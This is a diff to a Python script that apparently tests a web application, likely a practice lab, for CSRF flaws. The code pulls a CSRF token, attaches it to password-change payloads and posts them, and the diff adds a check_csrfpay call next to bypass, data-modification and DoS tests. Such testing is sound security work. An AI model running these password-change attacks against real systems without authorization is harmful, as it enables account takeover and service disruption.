@@ -8,7 +8,7 @@ def csrf_attack(session, base_url, endpoint, payload):
     # Find the CSRF token
     user_token_input = soup.find('input', {'name': 'user_token'})
     if user_token_input:
-        user_token = user_token_input['value'] # type: ignore
+        user_token = user_token_input['value']
         payload['user_token'] = user_token
     
     response = session.post(base_url + endpoint, data=payload)
@@ -79,10 +79,6 @@ def check_csrfpay(session, base_url):
         response = session.get(csrf_url)
         soup = BeautifulSoup(response.content, 'html.parser')
         
-        # Debug: Print the page content to see what's being returned
-        print("CSRF Page Content:")
-        print(soup.prettify())
-        
         # Attempt to find the user_token input field or other relevant token
         user_token_input = soup.find('input', {'name': 'user_token'})
         
@@ -119,7 +115,7 @@ def check_csrfpay(session, base_url):
         
         # Perform the CSRF attack with each payload
         for i, payload in enumerate(payloads):
-            print(f"Testing payload {i+1}: {payload}")
+            print(f"Testing payload {i+1}")
             response = session.post(change_password_url, data=payload)
             
             if "Password Changed" in response.text:
@@ -129,8 +125,6 @@ def check_csrfpay(session, base_url):
     
     except Exception as e:
         print(f"An error occurred while testing for CSRF: {e}")
-
-
 
 # Example usage
 if __name__ == "__main__":
@@ -145,3 +139,4 @@ if __name__ == "__main__":
         test_bypassing_protection(session, base_url)
         test_modifying_data(session, base_url)
         test_dos(session, base_url)
+        check_csrfpay(session, base_url)
